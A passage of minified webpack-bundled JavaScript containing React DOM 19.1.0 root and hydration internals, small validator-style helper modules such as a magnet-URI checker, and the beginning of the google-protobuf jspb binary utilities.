                    n.blockedOn === e && (n.blockedOn = null)
                }
                for (; 0 < yh.length && null === (r = yh[0]).blockedOn; )
                    wh(r),
                    null === r.blockedOn && yh.shift();
                if (null != (r = (e.ownerDocument || e).$$reactFormReplay))
                    for (n = 0; n < r.length; n += 3) {
                        var o = r[n]
                          , i = r[n + 1]
                          , s = o[Re] || null;
                        if ("function" === typeof i)
                            s || Sh(r);
                        else if (s) {
                            var a = null;
                            if (i && i.hasAttribute("formAction")) {
                                if (o = i,
                                s = i[Re] || null)
                                    a = s.formAction;
                                else if (null !== ch(o))
                                    continue
                            } else
                                a = s.action;
                            "function" === typeof a ? r[n + 1] = a : (r.splice(n, 3),
                            n -= 3),
                            Sh(r)
                        }
                    }
            }
            function Bh(e) {
                this._internalRoot = e
            }
            function xh(e) {
                this._internalRoot = e
            }
            xh.prototype.render = Bh.prototype.render = function(e) {
                var t = this._internalRoot;
                if (null === t)
                    throw Error(s(409));
                Xd(t.current, kl(), e, t, null, null)
            }
            ,
            xh.prototype.unmount = Bh.prototype.unmount = function() {
                var e = this._internalRoot;
                if (null !== e) {
                    this._internalRoot = null;
                    var t = e.containerInfo;
                    Xd(e.current, 2, null, e, null, null),
                    jl(),
                    t[ke] = null
                }
            }
            ,
            xh.prototype.unstable_scheduleHydration = function(e) {
                if (e) {
                    var t = Oe();
                    e = {
                        blockedOn: null,
                        target: e,
                        priority: t
                    };
                    for (var r = 0; r < yh.length && 0 !== t && t < yh[r].priority; r++)
                        ;
                    yh.splice(r, 0, e),
                    0 === r && wh(e)
                }
            }
            ;
            var Oh = o.version;
            if ("19.1.0" !== Oh)
                throw Error(s(527, Oh, "19.1.0"));
            M.findDOMNode = function(e) {
                var t = e._reactInternals;
                if (void 0 === t) {
                    if ("function" === typeof e.render)
                        throw Error(s(188));
                    throw e = Object.keys(e).join(","),
                    Error(s(268, e))
                }
                return e = function(e) {
                    var t = e.alternate;
                    if (!t) {
                        if (null === (t = c(e)))
                            throw Error(s(188));
                        return t !== e ? null : e
                    }
                    for (var r = e, n = t; ; ) {
                        var o = r.return;
                        if (null === o)
                            break;
                        var i = o.alternate;
                        if (null === i) {
                            if (null !== (n = o.return)) {
                                r = n;
                                continue
                            }
                            break
                        }
                        if (o.child === i.child) {
                            for (i = o.child; i; ) {
                                if (i === r)
                                    return u(o),
                                    e;
                                if (i === n)
                                    return u(o),
                                    t;
                                i = i.sibling
                            }
                            throw Error(s(188))
                        }
                        if (r.return !== n.return)
                            r = o,
                            n = i;
                        else {
                            for (var a = !1, l = o.child; l; ) {
                                if (l === r) {
                                    a = !0,
                                    r = o,
                                    n = i;
                                    break
                                }
                                if (l === n) {
                                    a = !0,
                                    n = o,
                                    r = i;
                                    break
                                }
                                l = l.sibling
                            }
                            if (!a) {
                                for (l = i.child; l; ) {
                                    if (l === r) {
                                        a = !0,
                                        r = i,
                                        n = o;
                                        break
                                    }
                                    if (l === n) {
                                        a = !0,
                                        n = i,
                                        r = o;
                                        break
                                    }
                                    l = l.sibling
                                }
                                if (!a)
                                    throw Error(s(189))
                            }
                        }
                        if (r.alternate !== n)
                            throw Error(s(190))
                    }
                    if (3 !== r.tag)
                        throw Error(s(188));
                    return r.stateNode.current === r ? e : t
                }(t),
                e = null === (e = null !== e ? d(e) : null) ? null : e.stateNode
            }
            ;
            var _h = {
                bundleType: 0,
                version: "19.1.0",
                rendererPackageName: "react-dom",
                currentDispatcherRef: k,
                reconcilerVersion: "19.1.0"
            };
            if ("undefined" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__) {
                var Wh = __REACT_DEVTOOLS_GLOBAL_HOOK__;
                if (!Wh.isDisabled && Wh.supportsFiber)
                    try {
                        ue = Wh.inject(_h),
                        de = Wh
                    } catch (kh) {}
            }
            t.createRoot = function(e, t) {
                if (!a(e))
                    throw Error(s(299));
                var r = !1
                  , n = ""
                  , o = ba
                  , i = va
                  , c = wa;
                return null !== t && void 0 !== t && (!0 === t.unstable_strictMode && (r = !0),
                void 0 !== t.identifierPrefix && (n = t.identifierPrefix),
                void 0 !== t.onUncaughtError && (o = t.onUncaughtError),
                void 0 !== t.onCaughtError && (i = t.onCaughtError),
                void 0 !== t.onRecoverableError && (c = t.onRecoverableError),
                void 0 !== t.unstable_transitionCallbacks && t.unstable_transitionCallbacks),
                t = Yd(e, 1, !1, null, 0, r, n, o, i, c, 0, null),
                e[ke] = t.current,
                Lu(e),
                new Bh(t)
            }
            ,
            t.hydrateRoot = function(e, t, r) {
                if (!a(e))
                    throw Error(s(299));
                var n = !1
                  , o = ""
                  , i = ba
                  , c = va
                  , l = wa
                  , u = null;
                return null !== r && void 0 !== r && (!0 === r.unstable_strictMode && (n = !0),
                void 0 !== r.identifierPrefix && (o = r.identifierPrefix),
                void 0 !== r.onUncaughtError && (i = r.onUncaughtError),
                void 0 !== r.onCaughtError && (c = r.onCaughtError),
                void 0 !== r.onRecoverableError && (l = r.onRecoverableError),
                void 0 !== r.unstable_transitionCallbacks && r.unstable_transitionCallbacks,
                void 0 !== r.formState && (u = r.formState)),
                (t = Yd(e, 1, !0, t, 0, n, o, i, c, l, 0, u)).context = Jd(null),
                r = t.current,
                (o = ii(n = Be(n = kl()))).callback = null,
                si(r, o, n),
                r = n,
                t.current.lanes = r,
                Ce(t, r),
                Au(t),
                e[ke] = t.current,
                Lu(e),
                new xh(t)
            }
            ,
            t.version = "19.1.0"
        }
        ,
        7023: (e, t) => {
            "use strict";
            function r(e) {
                return r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                }
                : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                }
                ,
                r(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                "object" === r(e) && null !== e ? e = "function" === typeof e.toString ? e.toString() : "[object Object]" : (null === e || "undefined" === typeof e || isNaN(e) && !e.length) && (e = "");
                return String(e)
            }
            ,
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        7137: (e, t, r) => {
            const n = r(4950);
            e.exports = (e, t, r) => n(e, t, r) < 0
        }
        ,
        7244: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                return (0,
                n.default)((0,
                o.default)(e, t), t)
            }
            ;
            var n = i(r(1068))
              , o = i(r(1238));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        7246: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                if ((0,
                o.default)(e),
                0 !== e.indexOf("magnet:?"))
                    return !1;
                return i.test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /(?:^magnet:\?|[^?&]&)xt(?:\.1)?=urn:(?:(?:aich|bitprint|btih|ed2k|ed2khash|kzhash|md5|sha1|tree:tiger):[a-z0-9]{32}(?:[a-z0-9]{8})?|btmh:1220[a-z0-9]{64})(?:$|&)/i;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        7248: function(e, t, r) {
            var n = "function" == typeof Object.defineProperties ? Object.defineProperty : function(e, t, r) {
                e != Array.prototype && e != Object.prototype && (e[t] = r.value)
            }
              , o = "undefined" != typeof window && window === this ? this : "undefined" != typeof r.g && null != r.g ? r.g : this;
            function i() {
                i = function() {}
                ,
                o.Symbol || (o.Symbol = a)
            }
            function s(e, t) {
                this.a = e,
                n(this, "description", {
                    configurable: !0,
                    writable: !0,
                    value: t
                })
            }
            s.prototype.toString = function() {
                return this.a
            }
            ;
            var a = function() {
                var e = 0;
                return function t(r) {
                    if (this instanceof t)
                        throw new TypeError("Symbol is not a constructor");
                    return new s("jscomp_symbol_" + (r || "") + "_" + e++,r)
                }
            }();
            function c() {
                i();
                var e = o.Symbol.iterator;
                e || (e = o.Symbol.iterator = o.Symbol("Symbol.iterator")),
                "function" != typeof Array.prototype[e] && n(Array.prototype, e, {
                    configurable: !0,
                    writable: !0,
                    value: function() {
                        return function(e) {
                            return c(),
                            e = {
                                next: e
                            },
                            e[o.Symbol.iterator] = function() {
                                return this
                            }
                            ,
                            e
                        }(function(e) {
                            var t = 0;
                            return function() {
                                return t < e.length ? {
                                    done: !1,
                                    value: e[t++]
                                } : {
                                    done: !0
                                }
                            }
                        }(this))
                    }
                }),
                c = function() {}
            }
            !function(e, t) {
                if (t) {
                    var r = o;
                    e = e.split(".");
                    for (var i = 0; i < e.length - 1; i++) {
                        var s = e[i];
                        s in r || (r[s] = {}),
                        r = r[s]
                    }
                    (t = t(i = r[e = e[e.length - 1]])) != i && null != t && n(r, e, {
                        configurable: !0,
                        writable: !0,
                        value: t
                    })
                }
            }("Array.prototype.entries", (function(e) {
                return e || function() {
                    return function(e, t) {
                        c(),
                        e instanceof String && (e += "");
                        var r = 0
                          , n = {
                            next: function() {
                                if (r < e.length) {
                                    var o = r++;
                                    return {
                                        value: t(o, e[o]),
                                        done: !1
                                    }
                                }
                                return n.next = function() {
                                    return {
                                        done: !0,
                                        value: void 0
                                    }
                                }
                                ,
                                n.next()
                            }
                        };
                        return n[Symbol.iterator] = function() {
                            return n
                        }
                        ,
                        n
                    }(this, (function(e, t) {
                        return [e, t]
                    }
                    ))
                }
            }
            ));
            var l = this || self;
            function u(e, t, r) {
                e = e.split("."),
                r = r || l,
                e[0]in r || "undefined" == typeof r.execScript || r.execScript("var " + e[0]);
                for (var n; e.length && (n = e.shift()); )
                    e.length || void 0 === t ? r = r[n] && r[n] !== Object.prototype[n] ? r[n] : r[n] = {} : r[n] = t
            }
            function d(e) {
                var t = typeof e;
                if ("object" == t) {
                    if (!e)
                        return "null";
                    if (e instanceof Array)
                        return "array";
                    if (e instanceof Object)
                        return t;
                    var r = Object.prototype.toString.call(e);
                    if ("[object Window]" == r)
                        return "object";
                    if ("[object Array]" == r || "number" == typeof e.length && "undefined" != typeof e.splice && "undefined" != typeof e.propertyIsEnumerable && !e.propertyIsEnumerable("splice"))
                        return "array";
                    if ("[object Function]" == r || "undefined" != typeof e.call && "undefined" != typeof e.propertyIsEnumerable && !e.propertyIsEnumerable("call"))
                        return "function"
                } else if ("function" == t && "undefined" == typeof e.call)
                    return "object";
                return t
            }
            function h(e) {
                var t = typeof e;
                return "object" == t && null != e || "function" == t
            }
            var f = "constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");
            var p = Array.prototype.forEach ? function(e, t) {
                Array.prototype.forEach.call(e, t, void 0)
            }
            : function(e, t) {
                for (var r = e.length, n = "string" === typeof e ? e.split("") : e, o = 0; o < r; o++)
                    o in n && t.call(void 0, n[o], o, e)
            }
              , g = Array.prototype.map ? function(e, t) {
                return Array.prototype.map.call(e, t, void 0)
            }
            : function(e, t) {
                for (var r = e.length, n = Array(r), o = "string" === typeof e ? e.split("") : e, i = 0; i < r; i++)
                    i in o && (n[i] = t.call(void 0, o[i], i, e));
                return n
            }
            ;
            function y(e, t, r) {
                return 2 >= arguments.length ? Array.prototype.slice.call(e, t) : Array.prototype.slice.call(e, t, r)
            }
            function m(e, t, r, n) {
                var o = "Assertion failed";
                if (r) {
                    o += ": " + r;
                    var i = n
                } else
                    e && (o += ": " + e,
                    i = t);
                throw Error(o, i || [])
            }
            function b(e, t, r) {
                for (var n = [], o = 2; o < arguments.length; ++o)
                    n[o - 2] = arguments[o];
                return e || m("", null, t, n),
                e
            }
            function v(e, t) {
                for (var r = [], n = 1; n < arguments.length; ++n)
                    r[n - 1] = arguments[n];
                throw Error("Failure" + (e ? ": " + e : ""), r)
            }
            function w(e, t, r, n) {
                for (var o = [], i = 3; i < arguments.length; ++i)
                    o[i - 3] = arguments[i];
                e instanceof t || m("Expected instanceof %s but got %s.", [T(t), T(e)], r, o)
            }
            function T(e) {
                return e instanceof Function ? e.displayName || e.name || "unknown type name" : e instanceof Object ? e.constructor.displayName || e.constructor.name || Object.prototype.toString.call(e) : null === e ? "null" : typeof e
            }
            function A(e, t) {
                if (this.c = e,
                this.b = t,
                this.a = {},
                this.arrClean = !0,
                0 < this.c.length) {
                    for (e = 0; e < this.c.length; e++) {
                        var r = (t = this.c[e])[0];
                        this.a[r.toString()] = new S(r,t[1])
                    }
                    this.arrClean = !0
                }
            }
            function E(e) {
                this.a = 0,
                this.b = e
            }
            function P(e, t) {
                return e.b ? (t.a || (t.a = new e.b(t.value)),
                t.a) : t.value
            }
            function C(e) {
                e = e.a;
                var t, r = [];
                for (t in e)
                    Object.prototype.hasOwnProperty.call(e, t) && r.push(t);
                return r
            }
            function S(e, t) {
                this.key = e,
                this.value = t,
                this.a = void 0
            }
            function I(e) {
                if (8192 >= e.length)
                    return String.fromCharCode.apply(null, e);
                for (var t = "", r = 0; r < e.length; r += 8192)
                    t += String.fromCharCode.apply(null, y(e, r, r + 8192));
                return t
            }
            u("jspb.Map", A, void 0),
            A.prototype.g = function() {
                if (this.arrClean) {
                    if (this.b) {
                        var e, t = this.a;
                        for (e in t)
                            if (Object.prototype.hasOwnProperty.call(t, e)) {
                                var r = t[e].a;
                                r && r.g()
                            }
                    }
                } else {
                    for (this.c.length = 0,
                    (t = C(this)).sort(),
                    e = 0; e < t.length; e++) {
                        var n = this.a[t[e]];
                        (r = n.a) && r.g(),
                        this.c.push([n.key, n.value])
                    }
                    this.arrClean = !0
                }
                return this.c
            }
            ,
            A.prototype.toArray = A.prototype.g,
            A.prototype.Mc = function(e, t) {
                for (var r = this.g(), n = [], o = 0; o < r.length; o++) {
                    var i = this.a[r[o][0].toString()];
                    P(this, i);
                    var s = i.a;
                    s ? (b(t),
                    n.push([i.key, t(e, s)])) : n.push([i.key, i.value])
                }
                return n
            }
            ,
            A.prototype.toObject = A.prototype.Mc,
            A.fromObject = function(e, t, r) {
                t = new A([],t);
                for (var n = 0; n < e.length; n++) {
                    var o = e[n][0]
                      , i = r(e[n][1]);
                    t.set(o, i)
                }
                return t
            }
            ,
            E.prototype.next = function() {
                return this.a < this.b.length ? {
                    done: !1,
                    value: this.b[this.a++]
                } : {
                    done: !0,
                    value: void 0
                }
            }
            ,
            "undefined" != typeof Symbol && (E.prototype[Symbol.iterator] = function() {
                return this
            }
            ),
            A.prototype.Jb = function() {
                return C(this).length
            }
            ,
            A.prototype.getLength = A.prototype.Jb,
            A.prototype.clear = function() {
                this.a = {},
                this.arrClean = !1
            }
            ,
            A.prototype.clear = A.prototype.clear,
            A.prototype.Cb = function(e) {
                e = e.toString();
                var t = this.a.hasOwnProperty(e);
                return delete this.a[e],
                this.arrClean = !1,
                t
            }
            ,
            A.prototype.del = A.prototype.Cb,
            A.prototype.Eb = function() {
                var e = []
                  , t = C(this);
                t.sort();
                for (var r = 0; r < t.length; r++) {
                    var n = this.a[t[r]];
                    e.push([n.key, n.value])
                }
                return e
            }
            ,
            A.prototype.getEntryList = A.prototype.Eb,
            A.prototype.entries = function() {
                var e = []
                  , t = C(this);
                t.sort();
                for (var r = 0; r < t.length; r++) {
                    var n = this.a[t[r]];
                    e.push([n.key, P(this, n)])
                }
                return new E(e)
            }
            ,
            A.prototype.entries = A.prototype.entries,
            A.prototype.keys = function() {
                var e = []
                  , t = C(this);
                t.sort();
                for (var r = 0; r < t.length; r++)
                    e.push(this.a[t[r]].key);
                return new E(e)
            }
            ,
            A.prototype.keys = A.prototype.keys,
            A.prototype.values = function() {
                var e = []
                  , t = C(this);
                t.sort();
                for (var r = 0; r < t.length; r++)
                    e.push(P(this, this.a[t[r]]));
                return new E(e)
            }
            ,
            A.prototype.values = A.prototype.values,
            A.prototype.forEach = function(e, t) {
                var r = C(this);
                r.sort();
                for (var n = 0; n < r.length; n++) {
                    var o = this.a[r[n]];
                    e.call(t, P(this, o), o.key, this)
                }
            }
            ,
            A.prototype.forEach = A.prototype.forEach,
            A.prototype.set = function(e, t) {
                var r = new S(e);
                return this.b ? (r.a = t,
                r.value = t.g()) : r.value = t,
                this.a[e.toString()] = r,
                this.arrClean = !1,
                this
            }
            ,
            A.prototype.set = A.prototype.set,
            A.prototype.get = function(e) {
                if (e = this.a[e.toString()])
                    return P(this, e)
            }
            ,
            A.prototype.get = A.prototype.get,
            A.prototype.has = function(e) {
                return e.toString()in this.a
            }
            ,
            A.prototype.has = A.prototype.has,
            A.prototype.Jc = function(e, t, r, n, o) {
                var i = C(this);
                i.sort();
                for (var s = 0; s < i.length; s++) {
                    var a = this.a[i[s]];
                    t.Va(e),
                    r.call(t, 1, a.key),
                    this.b ? n.call(t, 2, P(this, a), o) : n.call(t, 2, a.value),
                    t.Ya()
                }
            }
            ,
            A.prototype.serializeBinary = A.prototype.Jc,
            A.deserializeBinary = function(e, t, r, n, o, i, s) {
                for (; t.oa() && !t.bb(); ) {
                    var a = t.c;
                    1 == a ? i = r.call(t) : 2 == a && (e.b ? (b(o),
                    s || (s = new e.b),
                    n.call(t, s, o)) : s = n.call(t))
                }
                b(void 0 != i),
                b(void 0 != s),
                e.set(i, s)
            }
            ;
            var B = {
                "\0": "\\0",
                "\b": "\\b",
                "\f": "\\f",
                "\n": "\\n",
                "\r": "\\r",
                "\t": "\\t",
                "\v": "\\x0B",
                '"': '\\"',
                "\\": "\\\\",
                "<": "\\u003C"
            }
              , x = {
                "'": "\\'"
            }
              , O = {}
              , _ = null;
            function W(e, t) {
                void 0 === t && (t = 0),
                k(),
                t = O[t];
                for (var r = [], n = 0; n < e.length; n += 3) {
                    var o = e[n]
                      , i = n + 1 < e.length
                      , s = i ? e[n + 1] : 0
                      , a = n + 2 < e.length
                      , c = a ? e[n + 2] : 0
                      , l = o >> 2;
                    o = (3 & o) << 4 | s >> 4,
                    s = (15 & s) << 2 | c >> 6,
                    c &= 63,
                    a || (c = 64,
                    i || (s = 64)),
                    r.push(t[l], t[o], t[s] || "", t[c] || "")
                }
                return r.join("")
            }
            function R(e) {
                var t = e.length
                  , r = 3 * t / 4;
                r % 3 ? r = Math.floor(r) : -1 != "=.".indexOf(e[t - 1]) && (r = -1 != "=.".indexOf(e[t - 2]) ? r - 2 : r - 1);
                var n = new Uint8Array(r)
                  , o = 0;
                return function(e, t) {
                    function r(t) {
                        for (; n < e.length; ) {
                            var r = e.charAt(n++)
                              , o = _[r];
                            if (null != o)
                                return o;
                            if (!/^[\s\xa0]*$/.test(r))
                                throw Error("Unknown base64 encoding at char: " + r)
                        }
                        return t
                    }
                    k();
                    for (var n = 0; ; ) {
                        var o = r(-1)
                          , i = r(0)
                          , s = r(64)
                          , a = r(64);
                        if (64 === a && -1 === o)
                            break;
                        t(o << 2 | i >> 4),
                        64 != s && (t(i << 4 & 240 | s >> 2),
                        64 != a && t(s << 6 & 192 | a))
                    }
                }(e, (function(e) {
                    n[o++] = e
                }
                )),
                n.subarray(0, o)
            }
            function k() {
                if (!_) {
                    _ = {};
                    for (var e = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), t = ["+/=", "+/", "-_=", "-_.", "-_"], r = 0; 5 > r; r++) {
                        var n = e.concat(t[r].split(""));
                        O[r] = n;
                        for (var o = 0; o < n.length; o++) {
                            var i = n[o];
                            void 0 === _[i] && (_[i] = o)
                        }
                    }
                }
            }
            u("jspb.ConstBinaryMessage", (function() {}
            ), void 0),
            u("jspb.BinaryMessage", (function() {}
            ), void 0),
            u("jspb.BinaryConstants.FieldType", {
                yb: -1,
                ee: 1,
                FLOAT: 2,
                ke: 3,
                te: 4,
                je: 5,
                xb: 6,
                wb: 7,
                BOOL: 8,
                re: 9,
                ie: 10,
                le: 11,
                ce: 12,
                se: 13,
                ge: 14,
                me: 15,
                ne: 16,
                oe: 17,
                pe: 18,
                he: 30,
                ve: 31
            }, void 0),
            u("jspb.BinaryConstants.WireType", {
                yb: -1,
                ue: 0,
                xb: 1,
                de: 2,
                qe: 3,
                fe: 4,
                wb: 5
            }, void 0),
            u("jspb.BinaryConstants.FieldTypeToWireType", (function(e) {
                switch (e) {
                case 5:
                case 3:
                case 13:
                case 4:
                case 17:
                case 18:
                case 8:
                case 14:
                case 31:
                    return 0;
                case 1:
                case 6:
                case 16:
                case 30:
                    return 1;
                case 9:
                case 11:
                case 12:
                    return 2;
                case 2:
                case 7:
                case 15:
                    return 5;
                default:
                    return -1
                }
            }
            ), void 0),
            u("jspb.BinaryConstants.INVALID_FIELD_NUMBER", -1, void 0),
            u("jspb.BinaryConstants.FLOAT32_EPS", 1401298464324817e-60, void 0),
            u("jspb.BinaryConstants.FLOAT32_MIN", 11754943508222875e-54, void 0),
            u("jspb.BinaryConstants.FLOAT32_MAX", 34028234663852886e22, void 0),
            u("jspb.BinaryConstants.FLOAT64_EPS", 5e-324, void 0),
            u("jspb.BinaryConstants.FLOAT64_MIN", 22250738585072014e-324, void 0),
            u("jspb.BinaryConstants.FLOAT64_MAX", 17976931348623157e292, void 0),
            u("jspb.BinaryConstants.TWO_TO_20", 1048576, void 0),
            u("jspb.BinaryConstants.TWO_TO_23", 8388608, void 0),
            u("jspb.BinaryConstants.TWO_TO_31", 2147483648, void 0),
            u("jspb.BinaryConstants.TWO_TO_32", 4294967296, void 0),
            u("jspb.BinaryConstants.TWO_TO_52", 4503599627370496, void 0),
            u("jspb.BinaryConstants.TWO_TO_63", 0x8000000000000000, void 0),
            u("jspb.BinaryConstants.TWO_TO_64", 0x10000000000000000, void 0),
            u("jspb.BinaryConstants.ZERO_HASH", "\0\0\0\0\0\0\0\0", void 0);
            var M = 0
              , N = 0;
            function F(e) {
                var t = e >>> 0;
                e = Math.floor((e - t) / 4294967296) >>> 0,
                M = t,
                N = e
            }
            function U(e) {
                var t = 0 > e
                  , r = (e = Math.abs(e)) >>> 0;
                e = Math.floor((e - r) / 4294967296),
                e >>>= 0,
                t && (e = ~e >>> 0,
                4294967295 < (r = (~r >>> 0) + 1) && (r = 0,
                4294967295 < ++e && (e = 0))),
                M = r,
                N = e
            }
            function D(e) {
                var t = 0 > e;
                F(e = 2 * Math.abs(e)),
                e = M;
                var r = N;
                t && (0 == e ? 0 == r ? r = e = 4294967295 : (r--,
                e = 4294967295) : e--),
                M = e,
                N = r
            }
            function L(e) {
                var t = 0 > e ? 1 : 0;
                if (0 === (e = t ? -e : e))
                    0 < 1 / e ? M = N = 0 : (N = 0,
                    M = 2147483648);
                else if (isNaN(e))
                    N = 0,
                    M = 2147483647;
                else if (34028234663852886e22 < e)
                    N = 0,
                    M = (t << 31 | 2139095040) >>> 0;
                else if (11754943508222875e-54 > e)
                    e = Math.round(e / Math.pow(2, -149)),
                    N = 0,
                    M = (t << 31 | e) >>> 0;
                else {
                    var r = Math.floor(Math.log(e) / Math.LN2);
                    e *= Math.pow(2, -r),
                    16777216 <= (e = Math.round(8388608 * e)) && ++r,
                    N = 0,
                    M = (t << 31 | r + 127 << 23 | 8388607 & e) >>> 0
                }
            }
            function j(e) {
                var t = 0 > e ? 1 : 0;
                if (0 === (e = t ? -e : e))
                    N = 0 < 1 / e ? 0 : 2147483648,
                    M = 0;
                else if (isNaN(e))
                    N = 2147483647,
                    M = 4294967295;
                else if (17976931348623157e292 < e)
                    N = (t << 31 | 2146435072) >>> 0,
                    M = 0;
                else if (22250738585072014e-324 > e)
                    e /= Math.pow(2, -1074),
                    N = (t << 31 | e / 4294967296) >>> 0,
                    M = e >>> 0;
                else {
                    var r = e
                      , n = 0;
                    if (2 <= r)
                        for (; 2 <= r && 1023 > n; )
                            n++,
                            r /= 2;
                    else
                        for (; 1 > r && -1022 < n; )
                            r *= 2,
                            n--;
                    e *= Math.pow(2, -n),
                    N = (t << 31 | n + 1023 << 20 | 1048576 * e & 1048575) >>> 0,
                    M = 4503599627370496 * e >>> 0
                }
            }
            function z(e) {
                var t = e.charCodeAt(4)
                  , r = e.charCodeAt(5)
                  , n = e.charCodeAt(6)
                  , o = e.charCodeAt(7);
                M = e.charCodeAt(0) + (e.charCodeAt(1) << 8) + (e.charCodeAt(2) << 16) + (e.charCodeAt(3) << 24) >>> 0,
                N = t + (r << 8) + (n << 16) + (o << 24) >>> 0
            }
            function V(e, t) {
                return 4294967296 * t + (e >>> 0)
            }
            function H(e, t) {
                var r = 2147483648 & t;
                return r && (t = ~t >>> 0,
                0 == (e = 1 + ~e >>> 0) && (t = t + 1 >>> 0)),
                e = V(e, t),
                r ? -e : e
            }
            function q(e, t, r) {
                var n = t >> 31;
                return r(e << 1 ^ n, (t << 1 | e >>> 31) ^ n)
            }
            function G(e, t) {
                return $(e, t, H)
            }
            function $(e, t, r) {
                var n = -(1 & e);
                return r((e >>> 1 | t << 31) ^ n, t >>> 1 ^ n)
            }
            function K(e) {
                var t = 2 * (e >> 31) + 1
                  , r = e >>> 23 & 255;
                return e &= 8388607,
                255 == r ? e ? NaN : 1 / 0 * t : 0 == r ? t * Math.pow(2, -149) * e : t * Math.pow(2, r - 150) * (e + Math.pow(2, 23))
            }
            function Z(e, t) {
                var r = 2 * (t >> 31) + 1
                  , n = t >>> 20 & 2047;
                return e = 4294967296 * (1048575 & t) + e,
                2047 == n ? e ? NaN : 1 / 0 * r : 0 == n ? r * Math.pow(2, -1074) * e : r * Math.pow(2, n - 1075) * (e + 4503599627370496)
            }
            function Y(e, t) {
                return String.fromCharCode(e >>> 0 & 255, e >>> 8 & 255, e >>> 16 & 255, e >>> 24 & 255, t >>> 0 & 255, t >>> 8 & 255, t >>> 16 & 255, t >>> 24 & 255)
            }
            function J(e, t) {
                function r(e, t) {
                    return e = e ? String(e) : "",
                    t ? "0000000".slice(e.length) + e : e
                }
                if (2097151 >= t)
                    return "" + V(e, t);
                var n = (e >>> 24 | t << 8) >>> 0 & 16777215;
                return e = (16777215 & e) + 6777216 * n + 6710656 * (t = t >> 16 & 65535),
                n += 8147497 * t,
                t *= 2,
                1e7 <= e && (n += Math.floor(e / 1e7),
                e %= 1e7),
                1e7 <= n && (t += Math.floor(n / 1e7),
                n %= 1e7),
                r(t, 0) + r(n, t) + r(e, 1)
            }
            function X(e, t) {
                var r = 2147483648 & t;
                return r && (t = ~t + (0 == (e = 1 + ~e >>> 0) ? 1 : 0) >>> 0),
                e = J(e, t),
                r ? "-" + e : e
            }
            function Q(e, t) {
                z(e),
                e = M;
                var r = N;
                return t ? X(e, r) : J(e, r)
            }
            function ee(e) {
                function t(e, t) {
                    for (var r = 0; 8 > r && (1 !== e || 0 < t); r++)
                        t = e * n[r] + t,
                        n[r] = 255 & t,
                        t >>>= 8
                }
                b(0 < e.length);
                var r = !1;
                "-" === e[0] && (r = !0,
                e = e.slice(1));
                for (var n = [0, 0, 0, 0, 0, 0, 0, 0], o = 0; o < e.length; o++)
                    t(10, e.charCodeAt(o) - 48);
                return r && (function() {
                    for (var e = 0; 8 > e; e++)
                        n[e] = 255 & ~n[e]
                }(),
                t(1, 1)),
                I(n)
            }
            function te(e) {
                return String.fromCharCode(10 > e ? 48 + e : 87 + e)
            }
            function re(e) {
                return 97 <= e ? e - 97 + 10 : e - 48
            }
            function ne(e, t, r, n, o) {
                var i = 0;
                if (128 > n)
                    for (; t < r && e[t++] == n; )
                        i++,
                        t += o;
                else
                    for (; t < r; ) {
                        for (var s = n; 128 < s; ) {
                            if (e[t++] != (127 & s | 128))
                                return i;
                            s >>= 7
                        }
                        if (e[t++] != s)
                            break;
                        i++,
                        t += o
                    }
                return i
            }
            function oe(e) {
                return e.constructor === Uint8Array ? e : e.constructor === ArrayBuffer || e.constructor === Array ? new Uint8Array(e) : e.constructor === String ? R(e) : e instanceof Uint8Array ? new Uint8Array(e.buffer,e.byteOffset,e.byteLength) : (v("Type not convertible to Uint8Array."),
                new Uint8Array(0))
            }
            function ie(e, t, r) {
                this.b = null,
                this.a = this.c = this.h = 0,
                this.v = !1,
                e && this.H(e, t, r)
            }
            u("jspb.utils.getSplit64Low", (function() {
                return M
            }
            ), void 0),
            u("jspb.utils.getSplit64High", (function() {
                return N
            }
            ), void 0),
            u("jspb.utils.splitUint64", F, void 0),
            u("jspb.utils.splitInt64", U, void 0),
            u("jspb.utils.splitZigzag64", D, void 0),
            u("jspb.utils.splitFloat32", L, void 0),
            u("jspb.utils.splitFloat64", j, void 0),
            u("jspb.utils.splitHash64", z, void 0),
            u("jspb.utils.joinUint64", V, void 0),
            u("jspb.utils.joinInt64", H, void 0),
            u("jspb.utils.toZigzag64", q, void 0),
            u("jspb.utils.joinZigzag64", G, void 0),
            u("jspb.utils.fromZigzag64", $, void 0),
            u("jspb.utils.joinFloat32", K, void 0),
            u("jspb.utils.joinFloat64", Z, void 0),
            u("jspb.utils.joinHash64", Y, void 0),
            u("jspb.utils.DIGITS", "0123456789abcdef".split(""), void 0),
            u("jspb.utils.joinUnsignedDecimalString", J, void 0),
            u("jspb.utils.joinSignedDecimalString", X, void 0),
            u("jspb.utils.hash64ToDecimalString", Q, void 0),
            u("jspb.utils.hash64ArrayToDecimalStrings", (function(e, t) {
                for (var r = Array(e.length), n = 0; n < e.length; n++)
                    r[n] = Q(e[n], t);
                return r
            }
            ), void 0),
            u("jspb.utils.decimalStringToHash64", ee, void 0),
            u("jspb.utils.splitDecimalString", (function(e) {
                z(ee(e))
            }
            ), void 0),
            u("jspb.utils.hash64ToHexString", (function(e) {
                var t = Array(18);
                t[0] = "0",
                t[1] = "x";
                for (var r = 0; 8 > r; r++) {
                    var n = e.charCodeAt(7 - r);
                    t[2 * r + 2] = te(n >> 4),
                    t[2 * r + 3] = te(15 & n)
                }
                return t.join("")
            }
            ), void 0),
            u("jspb.utils.hexStringToHash64", (function(e) {
                b(18 == (e = e.toLowerCase()).length),
                b("0" == e[0]),
                b("x" == e[1]);
                for (var t = "", r = 0; 8 > r; r++)
